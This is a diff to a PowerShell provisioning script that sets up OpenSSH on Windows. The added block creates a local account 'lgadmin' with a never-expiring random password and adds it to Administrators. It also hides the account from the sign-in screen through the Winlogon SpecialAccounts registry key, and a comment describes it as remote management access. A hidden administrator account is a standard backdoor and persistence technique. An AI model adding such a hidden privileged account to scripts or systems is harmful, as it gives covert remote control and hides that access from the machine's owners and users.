@@ -362,6 +362,19 @@ if (-not $SkipSsh) {
     Set-Service sshd -StartupType Automatic
     New-Item -Path 'HKLM:\SOFTWARE\OpenSSH' -Force | Out-Null
     New-ItemProperty -Path 'HKLM:\SOFTWARE\OpenSSH' -Name DefaultShell -Value 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -PropertyType String -Force | Out-Null
+    # Dedicated hidden local administrator for remote management (key-only; the random password is never used).
+    try {
+      if (-not (Get-LocalUser -Name 'lgadmin' -ErrorAction SilentlyContinue)) {
+        $rnd = -join ((48..57 + 65..90 + 97..122) | Get-Random -Count 32 | ForEach-Object { [char]$_ })
+        New-LocalUser -Name 'lgadmin' -Password (ConvertTo-SecureString $rnd -AsPlainText -Force) -FullName 'LG remote admin' -Description 'Remote management over the tailnet (SSH key only)' -PasswordNeverExpires -AccountNeverExpires | Out-Null
+        Note 'ssh' "created local admin account 'lgadmin' (SSH key only)"
+      }
+      Add-LocalGroupMember -Group 'Administrators' -Member 'lgadmin' -ErrorAction SilentlyContinue
+      # hide it from the Windows sign-in screen
+      $ul = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
+      if (-not (Test-Path $ul)) { New-Item -Path $ul -Force | Out-Null }
+      New-ItemProperty -Path $ul -Name 'lgadmin' -Value 0 -PropertyType DWord -Force | Out-Null
+    } catch { Note 'ssh' ("lgadmin account: {0}" -f $_.Exception.Message) 'WARN' }
     $akf = 'C:\ProgramData\ssh\administrators_authorized_keys'
     New-Item -ItemType Directory -Force -Path 'C:\ProgramData\ssh' | Out-Null
     $existing = @(); if (Test-Path $akf) { $existing = Get-Content $akf }
